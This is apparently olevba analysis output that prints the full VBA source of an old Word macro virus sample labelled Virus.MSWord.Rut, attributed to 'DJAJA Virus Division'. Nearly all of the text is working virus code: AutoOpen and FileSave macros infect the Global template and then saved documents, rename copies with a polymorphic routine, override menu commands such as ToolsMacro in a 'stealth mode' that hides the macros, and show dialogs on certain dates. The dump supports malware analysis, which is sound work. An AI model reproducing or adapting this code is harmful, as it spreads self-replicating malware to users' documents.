olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rut-85e9bd366ee397d6c034011e670a3e936624da2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rut-85e9bd366ee397d6c034011e670a3e936624da2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Rut-85e9bd366ee397d6c034011e670a3e936624da2f - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim I
Dim F$
Dim G$
Dim H$
Dim I_$
ReDim AI__$(0)
Dim J
Dim Rnd_$
Dim K
Dim B1$
Dim B2$
Dim B3$
Dim B4$
Dim B5$
Dim B6$
Dim B7$
Dim B8$
Dim B9$
Dim B0$
Dim Y$
Dim T
Dim dlg As Object
    WordBasic.DisableInput 1
    On Error GoTo -1: On Error GoTo ErrFClose
    Dim Allready: Let Allready = 0
    
    '** Check macros ID in GlobalTemplate
     For I = 1 To WordBasic.CountMacros(0)
      If Len(WordBasic.[MacroName$](I, 0)) = 20 Then
        F$ = Mid(WordBasic.[MacroName$](I, 0), 20, 1)
        G$ = Mid(WordBasic.[MacroName$](I, 0), 1, 1)
        H$ = Mid(WordBasic.[MacroName$](I, 0), 19, 1)
        I_$ = Mid(WordBasic.[MacroName$](I, 0), 2, 1)
        If (F$ = G$) And (H$ = I_$) Then
         Let Allready = -1
        End If
      End If
     Next I
    
    If Not Allready Then
    '** Dilakukan bila global belum tertular
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave"

    '** Polymorphic engine
       ReDim AI__$(11)
       For J = 1 To WordBasic.CountMacros(1)
       If Len(WordBasic.[MacroName$](J, 1)) = 20 Then
         F$ = Mid(WordBasic.[MacroName$](J, 1), 20, 1)
         G$ = Mid(WordBasic.[MacroName$](J, 1), 1, 1)
         H$ = Mid(WordBasic.[MacroName$](J, 1), 19, 1)
         I_$ = Mid(WordBasic.[MacroName$](J, 1), 2, 1)
         If (F$ = G$) And (H$ = I_$) Then
              Rnd_$ = WordBasic.[MacroName$](J, 1)
              'MsgBox(MacroName$(J, 1))
              For K = 1 To 10
                AI__$(K) = String(1, num)
              Next K
              B1$ = AI__$(1): B2$ = AI__$(2)
              B3$ = AI__$(3): B4$ = AI__$(4)
              B5$ = AI__$(5): B6$ = AI__$(6)
              B7$ = AI__$(7): B8$ = AI__$(8)
              B9$ = AI__$(9): B0$ = AI__$(10)
              Y$ = ""
              For T = 1 To 10
                Y$ = AI__$(T) + Y$
              Next T
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:" + Y$ + B1$ + B2$ + B3$ + B4$ + B5$ + B6$ + B7$ + B8$ + B9$ + B0$

              '* Stealth mode
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsMacro"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ViewToolBars"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:FileTemplates"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsCustomize"
              WordBasic.SaveTemplate
         End If
       End If
      Next J


    Else
         '** Dilakukan bila Global telah tertular
         For J = 1 To WordBasic.CountMacros(0)
          If Len(WordBasic.[MacroName$](J, 0)) = 20 Then
          F$ = Mid(WordBasic.[MacroName$](J, 0), 20, 1)
          G$ = Mid(WordBasic.[MacroName$](J, 0), 1, 1)
          H$ = Mid(WordBasic.[MacroName$](J, 0), 19, 1)
          I_$ = Mid(WordBasic.[MacroName$](J, 0), 2, 1)
           If (F$ = G$) And (H$ = I_$) Then
             'MsgBox("Ialah  " + MacroName$(J, 0))
             Rnd_$ = WordBasic.[MacroName$](J, 0)
             WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave"
             WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
             WordBasic.MacroCopy "Global:" + Rnd_$, WordBasic.[FileName$]() + ":" + Rnd_$

             WordBasic.FileSummaryInfo Update:=1
             Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
             WordBasic.CurValues.FileSummaryInfo dlg
             If (dlg.Directory <> "") And (dlg.CreateDate <> "") And (dlg.FileSize <> "0") Then
               WordBasic.FileSaveAs Format:=1
             End If
           End If
          End If
         Next J
 End If

ErrFClose:
    On Error GoTo -1: On Error GoTo 0
    WordBasic.FileSave
    WordBasic.FileSaveAs Format:=1

Succes:
End Sub

Private Function num()
Dim a
Dim b
      a = 65
      b = 90
      num = WordBasic.Int(Rnd() * (b - a) + a)
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Rut-85e9bd366ee397d6c034011e670a3e936624da2f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim I
Dim F$
Dim G$
Dim H$
Dim I_$
ReDim AI__$(0)
Dim J
Dim Rnd_$
Dim K
Dim B1$
Dim B2$
Dim B3$
Dim B4$
Dim B5$
Dim B6$
Dim B7$
Dim B8$
Dim B9$
Dim B0$
Dim Y$
Dim T
    WordBasic.DisableInput 1
    On Error GoTo -1: On Error GoTo ErrOpen
    Dim Allready
    Let Allready = 0
    

    '** Check macros ID in GlobalTemplate
     For I = 1 To WordBasic.CountMacros(0)
      If Len(WordBasic.[MacroName$](I, 0)) = 20 Then
        F$ = Mid(WordBasic.[MacroName$](I, 0), 20, 1)
        G$ = Mid(WordBasic.[MacroName$](I, 0), 1, 1)
        H$ = Mid(WordBasic.[MacroName$](I, 0), 19, 1)
        I_$ = Mid(WordBasic.[MacroName$](I, 0), 2, 1)
        If (F$ = G$) And (H$ = I_$) Then
         Let Allready = -1
        End If
      End If
     Next I


    If Not Allready Then
      '** Dilakukan bila global belum tertular
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave"
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"

      '** Polymorphic engine
      ReDim AI__$(11)
      For J = 1 To WordBasic.CountMacros(1)
      If Len(WordBasic.[MacroName$](J, 1)) = 20 Then
        F$ = Mid(WordBasic.[MacroName$](J, 1), 20, 1)
        G$ = Mid(WordBasic.[MacroName$](J, 1), 1, 1)
        H$ = Mid(WordBasic.[MacroName$](J, 1), 19, 1)
        I_$ = Mid(WordBasic.[MacroName$](J, 1), 2, 1)
        If (F$ = G$) And (H$ = I_$) Then
              Rnd_$ = WordBasic.[MacroName$](J, 1)
              'MsgBox(MacroName$(J, 1))
              For K = 1 To 10
                AI__$(K) = String(1, num)
              Next K
              B1$ = AI__$(1): B2$ = AI__$(2)
              B3$ = AI__$(3): B4$ = AI__$(4)
              B5$ = AI__$(5): B6$ = AI__$(6)
              B7$ = AI__$(7): B8$ = AI__$(8)
              B9$ = AI__$(9): B0$ = AI__$(10)
              Y$ = ""
              For T = 1 To 10
                Y$ = AI__$(T) + Y$
              Next T
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:" + Y$ + B1$ + B2$ + B3$ + B4$ + B5$ + B6$ + B7$ + B8$ + B9$ + B0$

              '* Stealth mode
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsMacro"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ViewToolBars"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:FileTemplates"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsCustomize"
              WordBasic.SaveTemplate
        End If
      End If
      Next J

    Else
      '** Dilakukan bila global telah tertular
      For J = 1 To WordBasic.CountMacros(0)
       If Len(WordBasic.[MacroName$](J, 0)) = 20 Then
         F$ = Mid(WordBasic.[MacroName$](J, 0), 20, 1)
         G$ = Mid(WordBasic.[MacroName$](J, 0), 1, 1)
         H$ = Mid(WordBasic.[MacroName$](J, 0), 19, 1)
         I_$ = Mid(WordBasic.[MacroName$](J, 0), 2, 1)
           If (F$ = G$) And (H$ = I_$) Then
             'MsgBox("Ialah  " + MacroName$(J, 0))
             Rnd_$ = WordBasic.[MacroName$](J, 0)
             WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave"
             WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
             WordBasic.MacroCopy "Global:" + Rnd_$, WordBasic.[FileName$]() + ":" + Rnd_$
             WordBasic.FileSaveAs Format:=1
           End If
        End If
      Next J

End If

ErrOpen:
    DVD

End Sub

Private Sub DVD()
Dim Date_
Dim Sc
Dim dlg As Object
Dim Button
Dim Key$
Dim Me_
Dim Text1$, Text2$, Typer$, PassInputKey$
Dim Key1$, Key2$

Let Text1$ = "DVD v1.0. Copyright-1997, DVD Software. Ft-Mesin UNTAR'95"
Let Text2$ = "DJAJA Virus Division"
Let Key1$ = "DJAJA HD-LWP is Good"
Let Key2$ = "I LOVE HD-LWP"


Date_ = WordBasic.Day(WordBasic.Now())
If Date_ = 10 Or Date_ = 18 Or Date_ = 27 Then

Let Sc = WordBasic.Second(WordBasic.Now())
If Sc < 31 Then
 Let Typer$ = Key1$
 Let PassInputKey$ = Key1$
Else
 Let Typer$ = Key2$
 Let PassInputKey$ = Key2$
End If

WordBasic.BeginDialog 320, 92, "Welcome to My World"
    WordBasic.GroupBox 10, 6, 303, 77, ""
    WordBasic.Text 168, 58, 121, 13, "Created by F?D", "Text5"
    WordBasic.Text 168, 22, 125, 13, "DVD version 1.0", "Text1"
    WordBasic.OKButton 23, 24, 127, 21
    WordBasic.PushButton 23, 50, 127, 21, "About DVD", "Push1"
    WordBasic.Text 168, 41, 125, 13, "(C)opyright 1997", "Text2"
    WordBasic.Text 168, 60, 13, 1, "", "Text3"
    Runner (Text1$)
WordBasic.EndDialog

Set dlg = WordBasic.CurValues.UserDialog
Button = WordBasic.Dialog.UserDialog(dlg)

If dlg.Push1 Then
    WordBasic.BeginDialog 320, 80, "About DVD"
     WordBasic.TextBox 11, 26, 302, 18, "TextBox1"
     WordBasic.Text 11, 9, 235, 13, "Type " + Typer$, "Text1"
     WordBasic.OKButton 113, 52, 88, 21
     Runner (Text2$)
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog

    Set dlg = WordBasic.CurValues.UserDialog
    Button = WordBasic.Dialog.UserDialog(dlg)
    Key$ = dlg.TextBox1
    If Key$ = PassInputKey$ Then
     WordBasic.BeginDialog 574, 144, "About DVD"
      WordBasic.PushButton 196, 110, 193, 21, "DVD", "Push1"
      WordBasic.Text 19, 11, 361, 13, "Terima kasih telah mengetikkan dengan  benar. ", "Text1"
      WordBasic.Text 19, 29, 513, 13, "Saya dedikasikan kreasi saya ini untuk HD- LWP. Semoga HD-LWP ", "Text2"
      WordBasic.Text 19, 48, 541, 13, "selalu dilindungi oleh-Nya.  Jangan takut DVD tidak akan merusak data", "Text3"
      WordBasic.Text 19, 67, 533, 13, "Anda, apalagi sampai menghapusnya. DVD hanya akan mejeng setiap ", "Text5"
      WordBasic.Text 19, 86, 352, 13, "tanggal-tanggal tertentu saja.  Created by F?D", "Text6"
      WordBasic.Text 19, 67, 352, 1, "", "Text4"
     WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
    Set dlg = WordBasic.CurValues.UserDialog
    Let Me_ = WordBasic.Dialog.UserDialog(dlg)
    End If
    

 End If
End If
End Sub

Private Sub Runner(Texto$)
Dim I
Dim J
    For I = 1 To (Len(Texto$))
     For J = 1 To 100
     Next J
    WordBasic.PrintStatusBar WordBasic.[Right$](Texto$, I)
    Next I
End Sub

Private Function num()
Dim a
Dim b
      a = 65
      b = 90
      num = WordBasic.Int(Rnd() * (b - a) + a)
End Function
-------------------------------------------------------------------------------
VBA MACRO RUTATHHONRRNOHHTATUR.bas 
in file: Virus.MSWord.Rut-85e9bd366ee397d6c034011e670a3e936624da2f - OLE stream: 'Macros/VBA/RUTATHHONRRNOHHTATUR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    WordBasic.DisableInput 1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

